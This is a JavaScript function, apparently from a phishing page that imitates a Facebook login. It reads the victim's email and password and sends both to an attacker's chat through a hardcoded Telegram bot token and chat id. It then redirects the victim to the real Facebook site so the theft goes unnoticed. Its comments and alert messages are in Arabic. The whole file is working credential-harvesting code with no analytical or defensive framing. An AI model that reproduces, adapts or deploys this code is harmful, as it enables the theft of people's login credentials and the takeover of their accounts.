function sendData() {
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    const botToken = "5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q";
    const chatId = "2070423407";

    const message = `New Login:\nEmail: ${email}\nPassword: ${password}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
        .then(response => {
            if (response.ok) {
                window.location.href = "https://www.facebook.com/";  // إعادة توجيه المستخدم إلى Facebook
            } else {
                alert("حدث خطأ أثناء الإرسال.");
            }
        })
        .catch(error => {
            console.error("Error:", error);
            alert("حدث خطأ أثناء الإرسال.");
        });
}
